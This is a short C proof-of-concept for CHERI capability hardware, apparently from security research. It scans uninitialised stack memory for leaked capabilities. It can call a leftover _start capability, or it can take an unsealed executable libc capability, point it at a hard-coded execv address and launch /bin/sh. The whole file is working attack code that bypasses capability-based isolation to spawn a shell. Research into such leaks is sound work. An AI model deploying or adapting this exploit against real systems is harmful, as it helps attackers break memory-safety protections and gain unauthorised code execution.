#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <inttypes.h>
#include <cheriintrin.h>
#include "../../utils/utils.h"

#define MAX_PTRS 280

typedef int (*execv_t)(const char *, char * const[]);
typedef void (*start_t)(void);

int main(void) {
    uintptr_t execv_addr = 0x4026d90d; // This needs to be found and depends on the program!
    uintptr_t _start_base = 0x100000;

    char *str[MAX_PTRS];
    void *cap = NULL;

    for (int i = 0; i < MAX_PTRS; i++) {
        cap = str[i];
        uintptr_t base = cheri_base_get(cap);
        uintptr_t end = base + cheri_length_get(cap);

        if (!cheri_tag_get(cap)) continue;
        if ((cheri_perms_get(cap) & CHERI_PERM_EXECUTE)==0) continue;
        
        if (base == _start_base ) {
            printf("main: index %d: Found _start cap, press x to restart uncleaned _start " 
                "or any other to continue searching..\n", i);
            print_cap_info_short("_start cap", cap);
            char input = getchar();
            start_t start_ptr = (start_t)cap;
            if (input != 'x') continue;
            start_ptr();
            break;
        }
        
        if ((cheri_is_sealed(cap))) continue;

        if (execv_addr > base && execv_addr < end) {
            printf("main: index %d: Found unsealed libc cap containing execv addr: %p. Using it to open a shell..\n", i, (void *)execv_addr);
            print_cap_info_short("libc cap", cap);
            printf("\n");
            char *argv[] = { "sh", NULL };
            execv_t execv_ptr = (execv_t)cheri_address_set(cap, execv_addr);
            execv_ptr("/bin/sh", argv);
            break;
        }
    }

    return 0;
}